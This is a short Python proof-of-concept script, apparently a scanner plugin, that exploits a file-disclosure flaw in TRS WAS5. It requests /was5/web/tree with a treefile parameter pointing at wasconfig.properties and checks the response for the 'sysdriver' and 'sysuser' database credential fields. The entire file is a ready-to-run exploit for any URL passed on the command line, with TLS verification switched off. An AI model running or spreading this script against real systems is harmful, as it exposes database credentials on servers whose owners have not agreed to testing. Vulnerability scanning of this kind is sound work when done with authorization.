#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS was5配置文件泄露
referer: unknown
author: Lucifer
description: 文件/WEB-INF/classes/com/trs/was/resource/wasconfig.properties内容泄露。
'''
import sys
import requests
import warnings
def run(url):
        result = ['TRS was5配置文件泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"sysdriver" in req.text and r"sysuser" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
